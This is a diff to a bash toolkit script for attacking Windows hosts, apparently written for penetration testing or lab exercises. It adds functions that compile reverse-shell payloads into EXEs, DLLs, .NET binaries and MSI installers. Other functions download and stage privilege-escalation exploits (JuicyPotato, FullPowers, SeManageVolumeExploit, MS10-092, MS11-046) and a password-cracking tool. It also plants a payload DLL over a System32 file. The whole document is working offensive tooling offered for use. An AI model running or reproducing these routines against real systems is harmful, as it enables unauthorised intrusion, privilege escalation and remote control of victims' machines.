@@ -131,28 +131,112 @@ create_run_windows_exe() {
         command="$cmd"
     fi
     if [[ -z "$command" ]]; then
-        command=$(get_powershell_reverse_shell)
+        command=$(get_powershell_interactive_shell)
     fi
     if [ -z "$run_windows_filename" ]; then
         run_windows_filename="run_windows"
     fi
-    string_length=${#command}
-    echo "The length of the cmd string is: $string_length"
+    local string_length=${#command}
+    echo "The length of the cmd string is: $string_length" >> $trail_log
     command=$(echo $command | sed -E 's/"/\\"/g')
     command=$(escape_sed "$command")
     cp "$SCRIPTDIR/../c/run_windows.c" $run_windows_filename.c
     sed -E -i 's/\{command\}/'"$command"'/g' $run_windows_filename.c
     x86_64-w64-mingw32-gcc -o $run_windows_filename.exe $run_windows_filename.c
     generate_windows_download "$run_windows_filename.exe"
-    if [ -z "$command" ]; then
-        echo "Command is required for creating run_windows_dll."
-        exit 1
+}
+
+create_run_windows_dll() {
+    local command=""
+    if [ ! -z "$1" ]; then
+        command="$1"
     fi
+    if [[ ! -z "$cmd" ]] && [[ -z "$command" ]]; then
+        command="$cmd"
+    fi
+    if [[ -z "$command" ]]; then
+        command=$(get_powershell_interactive_shell)
+    fi
+    if [ -z "$run_windows_filename" ]; then
+        run_windows_filename="run_windows"
+    fi
+    string_length=${#command}
+    echo "The length of the cmd string is: $string_length" >> $trail_log
+    command=$(echo $command | sed -E 's/"/\\"/g')
     command=$(escape_sed "$command")
-    cp "$SCRIPTDIR/../c/run_windows_dll.cpp" run_windows_dll.cpp
-    sed -E -i 's/\{command\}/'"$command"'/g' run_windows_dll.cpp
-    x86_64-w64-mingw32-gcc -shared -o run_windows.dll run_windows_dll.cpp
-    generate_windows_download "run_windows.dll"
+    cp "$SCRIPTDIR/../c/run_windows_dll.cpp" $run_windows_filename.cpp
+    sed -E -i 's/\{command\}/'"$command"'/g' $run_windows_filename.cpp
+    x86_64-w64-mingw32-gcc -shared -o $run_windows_filename.dll $run_windows_filename.cpp
+    generate_windows_download "$run_windows_filename.dll"
+}
+
+generate_windows_unzip() {
+    if [[ -z "$1" ]]; then
+        echo "Archive file is required"
+        return 1
+    fi
+    local archive_file="$1"
+    local destination_path="$2"
+    if [[ -z "$destination_path" ]]; then
+        destination_path="."
+    fi
+    echo "Expand-Archive -Path $archive_file -DestinationPath $destination_path -Force;"
+}
+
+create_dotnet_web() {
+    local project_name="dotnet_web_project"
+    if [[ ! -d "$project_name" ]]; then
+        mkdir "$project_name"
+    fi
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_reverse_shell)
+    fi
+    pushd "$project_name" || return 1
+    cp "$SCRIPTDIR/../cs/Program.cs" Program.cs.original
+    cp "$SCRIPTDIR/../cs/web.csproj" $project_name.csproj
+    cp "$SCRIPTDIR/../cs/Startup.cs" Startup.cs
+    cp "$SCRIPTDIR/../cs/WebApp.cs" WebApp.cs
+    cp "$SCRIPTDIR/../cs/CommandController.cs" CommandController.cs
+    dotnet clean
+    cp Program.cs.original Program.cs        
+    local command=$(escape_sed "$cmd")
+    sed -E -i 's/\{command\}/'"$command"'/g' Program.cs
+    dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
+    popd || return 1
+    if [[ -f "$project_name.zip" ]]; then
+        rm "$project_name.zip"
+    fi
+    zip -r $project_name.zip $project_name
+    generate_windows_download "$project_name.zip"
+    generate_windows_unzip "$project_name.zip"
+
+
+}
+
+create_dotnet() {
+    local project_name="dotnet_project"
+    if [[ ! -d "$project_name" ]]; then
+        mkdir "$project_name"
+    fi
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_reverse_shell)
+    fi
+    pushd "$project_name" || return 1
+    cp "$SCRIPTDIR/../cs/Program.cs" Program.cs.original
+    cp "$SCRIPTDIR/../cs/cs.csproj" $project_name.csproj
+    dotnet clean
+    cp Program.cs.original Program.cs        
+    local command=$(escape_sed "$cmd")
+    sed -E -i 's/\{command\}/'"$command"'/g' Program.cs
+    dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
+    popd || return 1
+    if [[ -f "$project_name.zip" ]]; then
+        rm "$project_name.zip"
+    fi
+    zip -r $project_name.zip $project_name
+    generate_windows_download "$project_name.zip"
+    powershell_extract_command
+
 }
 
 create_se_restore_abuse() {
@@ -165,6 +249,28 @@ create_restart_windows() {
     cp "$SCRIPTDIR/../c/RestartWindows.cpp" .
     x86_64-w64-mingw32-gcc -o RestartWindows.exe RestartWindows.cpp -lstdc++ -static
     generate_windows_download "RestartWindows.exe"
+}
+
+create_msi_installer() {
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_reverse_shell)
+    fi
+    local wix_directory="wix"
+    if [[ ! -d "$wix_directory" ]]; then
+        mkdir "$wix_directory"
+    fi
+    pushd "$wix_directory" || return 1
+    local command=$(escape_sed "$cmd")    
+    cp "$SCRIPTDIR/../xml/wix_msi.xml" wix_msi.wxs
+    sed -E -i 's/\{command\}/'"$command"'/g' wix_msi.wxs
+    create_run_windows_exe
+    scp run_windows.exe "$windows_username@$windows_computername:c:/users/$windows_username/run_windows.exe"
+    scp wix_msi.wxs "$windows_username@$windows_computername:c:/users/$windows_username/wix_msi.wxs"
+    local run_wix="wix build wix_msi.wxs"
+    ssh $windows_username@$windows_computername "$run_wix"
+    scp "$windows_username@$windows_computername:c:/users/$windows_username/wix_msi.msi" . 
+    popd || return 1
+    generate_windows_download "$wix_directory/wix_msi.msi" "installer.msi"
 }
 
 download_mimikatz() {
@@ -222,6 +328,56 @@ netuser_change_user_password() {
     echo "$cmd"
 }
 
+download_runas() {
+    local url="https://github.com/antonioCoco/RunasCs/archive/refs/heads/master.zip"
+    if [[ ! -d runascs ]]; then
+        echo "Downloading RunasCs tool."
+        wget "$url" -O runascs.zip >> $trail_log
+        unzip runascs.zip >> $trail_log
+        mv RunasCs-master runascs
+    fi
+    if [[ -z $username ]]; then
+        echo "Username is required for Invoke-RunasCs."
+        return 1
+    fi
+    if [[ -z $password ]]; then
+        echo "Password is required for Invoke-RunasCs."
+        return 1
+    fi
+    echo 'cd C:\windows\temp;'
+    if [[ -z $cmd ]]; then
+        cmd=$(get_powershell_interactive_shell)
+        create_run_windows_exe
+        cmd="c:\\windows\\temp\\run_windows.exe"
+    fi
+    generate_windows_download "runascs/Invoke-RunasCs.ps1" "Invoke-RunAsCs.ps1"
+    echo '. ./Invoke-RunasCs.ps1;'
+    echo "Invoke-RunasCs $username $password $cmd;"
+}
+
+perform_semanagevolume_exploit() {
+    local url="https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe"
+    local exploit_dir="SeManageVolumeExploit"
+    if [[ ! -d "$exploit_dir" ]]; then
+        mkdir "$exploit_dir"
+    fi
+    pushd $exploit_dir || return 1
+    if [[ ! -f "SeManageVolumeExploit.exe" ]]; then
+        echo "Downloading SeManageVolumeExploit..." >> $trail_log
+        wget "$url" -O SeManageVolumeExploit.exe >> $trail_log
+    fi
+    popd || return 1
+    echo 'cd C:\windows\temp;'
+    generate_windows_download "$exploit_dir/SeManageVolumeExploit.exe" "SeManageVolumeExploit.exe"    
+    echo '.\SeManageVolumeExploit.exe'
+    create_run_windows_dll
+    #echo 'move C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.old.dll'
+    #echo 'copy .\run_windows.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll'
+    #echo '$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")'
+    #echo '$object = [Activator]::CreateInstance($type)'
+    echo 'copy .\run_windows.dll C:\Windows\System32\wbem\tzres.dll'
+    echo "systeminfo"
+}
 #=========================
 #impersonation escalations
 #=========================
@@ -284,9 +440,23 @@ perform_sigma_potato() {
     echo ".\sigma_potato.exe \"$cmd\""
 }
 
+#https://ohpe.it/juicy-potato/CLSID/
+
 perform_juicy_potato(){
 
-    local url="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
+    local url=""
+    if [[ -z "$target_arch" ]]; then
+        target_arch="x64"
+    fi
+    if [[ -z "$target_clsid" ]]; then
+        echo "No target CLSID specified, please set one from https://ohpe.it/juicy-potato/CLSID/"
+        return 1
+    fi
+    if [[ "$target_arch" == "x64" ]]; then
+        url="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
+    else
+        url="https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe"
+    fi
     if [[ ! -f "JuicyPotato.exe" ]]; then
         echo "Downloading JuicyPotato..." >> $trail_log
         wget "$url" -O JuicyPotato.exe >> $trail_log
@@ -294,9 +464,9 @@ perform_juicy_potato(){
     echo 'cd C:\windows\temp;'
     generate_windows_download "JuicyPotato.exe"
     if [[ -z "$cmd" ]]; then
-        cmd=$(get_powershell_interactive_shell)
+        cmd="whoami"
     fi
-    echo ".\JuicyPotato.exe -a \"$cmd\""
+    echo ".\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c $cmd\" -t * -c $target_clsid"
 }
 
 perform_local_potato() {
@@ -312,6 +482,20 @@ perform_local_potato() {
         cmd=$(get_powershell_interactive_shell)
     fi
     echo ".\LocalPotato.exe \"$cmd\""
+}
+
+#in casses the local system is running with restricted
+
+perform_full_powers() {
+    local url="https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe"
+    if [[ ! -f FullPowers.exe ]]; then
+        echo "Downloading FullPowers..." >> $trail_log
+        wget "$url" -O FullPowers.exe >> $trail_log
+    fi
+    echo 'cd C:\windows\temp;'
+    generate_windows_download "FullPowers.exe"
+    echo '.\FullPowers.exe;'
+
 }
 
 #fujitsu cve-2018-16156
@@ -333,3 +517,72 @@ perform_cve_2018_16156() {
     generate_windows_download "$cve_dir.zip"
 
 }
+
+perform_ms10_092() {
+    echo "Exploit for MS10-092"
+    local cve_dir="MS10-092"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir "$cve_dir"
+    fi
+    pushd "$cve_dir" || return 1
+    if [[ ! -f 15589.wsf ]]; then
+        searchsploit -m 15589
+    fi
+    generate_windows_download "$cve_dir/15589.wsf" "15589.wsf"
+    popd || return 1
+    if [[ -f "$cve_dir.zip" ]]; then
+        rm "$cve_dir.zip"
+    fi
+    zip -r $cve_dir.zip $cve_dir
+    generate_windows_download "$cve_dir.zip"
+
+}   
+
+perform_ms11_046() {
+    echo "Exploit for MS11-046"
+    local cve_dir="MS11-046"
+    local exploit_name="exploit.exe"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir "$cve_dir"
+    fi
+    pushd "$cve_dir" || return 1
+
+    if [[ ! -f 40564.c ]]; then
+        searchsploit -m 40564
+    fi
+    i686-w64-mingw32-gcc 40564.c -o $exploit_name -lws2_32
+    popd || return 1
+    if [[ -f "$cve_dir.zip" ]]; then
+        rm "$cve_dir.zip"
+    fi
+    if [[ -f $cve_dir.zip ]]; then
+        rm $cve_dir.zip
+    fi  
+    zip -r $cve_dir.zip $cve_dir
+    generate_windows_download "$cve_dir.zip"
+
+}
+
+#argus password cracking cve-2022-25012
+
+perform_cve_2022_25012() {
+    echo "Downloading Argus password cracking tool"
+    local url="https://github.com/s3l33/CVE-2022-25012/archive/refs/heads/main.zip"
+    local cve_dir="CVE-2022-25012"
+    local password_hash="$1"
+    if [[ -z "$password_hash" ]]; then
+        echo "Password hash is required"
+        return 1
+    fi
+
+    if [[ ! -d "$cve_dir" ]]; then
+        wget "$url" -O cve_2022_25012.zip
+        unzip cve_2022_25012.zip
+        mv CVE-2022-25012-main "$cve_dir"
+        rm cve_2022_25012.zip
+    fi
+    pushd "$cve_dir" || return 1
+    python CVE-2022-25012.py "$password_hash"
+    popd || return 1
+}
+
